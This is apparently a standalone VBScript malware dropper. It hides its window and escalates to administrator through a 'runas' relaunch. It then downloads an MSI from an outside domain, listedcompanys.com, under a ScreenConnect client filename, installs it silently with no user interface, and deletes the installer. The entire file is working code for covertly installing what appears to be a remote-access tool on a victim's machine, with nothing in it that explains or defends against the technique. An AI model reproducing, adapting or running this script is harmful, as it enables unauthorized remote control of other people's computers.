Option Explicit
On Error Resume Next

Dim sh, shellApp, fso
Dim msiUrl, tempDir, msiPath
Dim rc, http, stream
Dim installCmd, scriptPath, wscriptPath

Set sh = CreateObject("WScript.Shell")
Set shellApp = CreateObject("Shell.Application")
Set fso = CreateObject("Scripting.FileSystemObject")

If sh Is Nothing Or shellApp Is Nothing Or fso Is Nothing Then WScript.Quit 1

msiUrl = "http://listedcompanys.com/li1.msi"
tempDir = sh.ExpandEnvironmentStrings("%TEMP%")
msiPath = fso.BuildPath(tempDir, "ScreenConnectClient_" & CStr(Int((Timer * 1000) Mod 1000000000)) & ".msi")

' Relaunch this same VBS elevated, without opening a console window.
rc = sh.Run("cmd.exe /c net session >nul 2>&1", 0, True)
If rc <> 0 Then
    scriptPath = Chr(34) & WScript.ScriptFullName & Chr(34)
    wscriptPath = fso.BuildPath(fso.GetParentFolderName(WScript.FullName), "wscript.exe")
    shellApp.ShellExecute wscriptPath, scriptPath, "", "runas", 0
    WScript.Quit 0
End If

' Download silently and follow redirects.
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If http Is Nothing Then WScript.Quit 1
http.Option(6) = True
http.Open "GET", msiUrl, False
http.SetRequestHeader "User-Agent", "Mozilla/5.0"
http.Send
If Err.Number <> 0 Then WScript.Quit 1
If http.Status < 200 Or http.Status >= 300 Then WScript.Quit 1

Set stream = CreateObject("ADODB.Stream")
If stream Is Nothing Then WScript.Quit 1
stream.Type = 1
stream.Open
stream.Write http.ResponseBody
stream.SaveToFile msiPath, 2
stream.Close
If Err.Number <> 0 Then
    If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
    WScript.Quit 1
End If

' Install silently and wait for completion.
installCmd = "msiexec.exe /i " & Chr(34) & msiPath & Chr(34) & " /qn /norestart"
rc = sh.Run(installCmd, 0, True)

' Remove the temporary installer.
If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
WScript.Quit rc

